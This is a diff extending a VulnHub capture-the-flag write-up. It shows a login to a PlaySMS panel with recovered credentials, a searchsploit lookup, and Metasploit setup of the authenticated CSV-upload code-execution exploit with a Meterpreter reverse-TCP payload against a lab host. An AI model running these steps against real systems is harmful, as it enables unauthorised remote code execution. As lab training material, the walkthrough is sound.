@@ -116,6 +116,83 @@ great now we have a user `touhid` and new directory `/SecreTSMSgatwayLogin`
 
 navigate to this directory and try to login with user touhid and test the passwords you found on comment previously :
 
+![playsms](https://github.com/Git-K3rnel/VulnHub/assets/127470407/4c63f263-9463-4470-afe6-bd227dfb9874)
+
+after trying the passwords, i found that i can login with `touhid:diana` :
+
+![loginpanel](https://github.com/Git-K3rnel/VulnHub/assets/127470407/46c5b8c5-a675-44be-be59-99662a022295)
+
+after a while searching, i found that searchsploit has something with `playsms` panel :
+
+```bash
+root@kali: searchsploit playsms 
+
+PlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution (Metasploit)  | php/remote/44598.rb
+PlaySMS - index.php Unauthenticated Template Injection Code Execution (Metasploit)  | php/remote/48335.rb
+...
+```
+
+use metasploit to get code execution :
+
+```bash
+root@kali: msfconsole
+
+msf6 > search playsms
+
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank       Check  Description
+   -  ----                                           ---------------  ----       -----  -----------
+   0  exploit/multi/http/playsms_uploadcsv_exec      2017-05-21       excellent  Yes    PlaySMS import.php Authenticated CSV File Upload Code Execution
+   1  exploit/multi/http/playsms_template_injection  2020-02-05       excellent  Yes    PlaySMS index.php Unauthenticated Template Injection Code Execution
+   2  exploit/multi/http/playsms_filename_exec       2017-05-21       excellent  Yes    PlaySMS sendfromfile.php Authenticated "Filename" Field Code Execution
+
+msf6 > use 0
+
+msf6 exploit(multi/http/playsms_uploadcsv_exec) > set password diana
+password => diana
+msf6 exploit(multi/http/playsms_uploadcsv_exec) > set username touhid
+username => touhid
+msf6 exploit(multi/http/playsms_uploadcsv_exec) > set rhosts 192.168.56.108
+rhosts => 192.168.56.108
+msf6 exploit(multi/http/playsms_uploadcsv_exec) > set targeturi /SecreTSMSgatwayLogin
+targeturi => /SecreTSMSgatwayLogin
+msf6 exploit(multi/http/playsms_uploadcsv_exec) > set lhost 192.168.56.102
+lhost => 192.168.56.102
+msf6 exploit(multi/http/playsms_uploadcsv_exec) > options
+
+Module options (exploit/multi/http/playsms_uploadcsv_exec):
+
+   Name       Current Setting        Required  Description
+   ----       ---------------        --------  -----------
+   PASSWORD   diana                  yes       Password to authenticate with
+   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.168.56.108         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      80                     yes       The target port (TCP)
+   SSL        false                  no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /SecreTSMSgatwayLogin  yes       Base playsms directory path
+   USERNAME   touhid                 yes       Username to authenticate with
+   VHOST                             no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.56.102   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   PlaySMS 1.4
+
+```
+
+
 
 
 
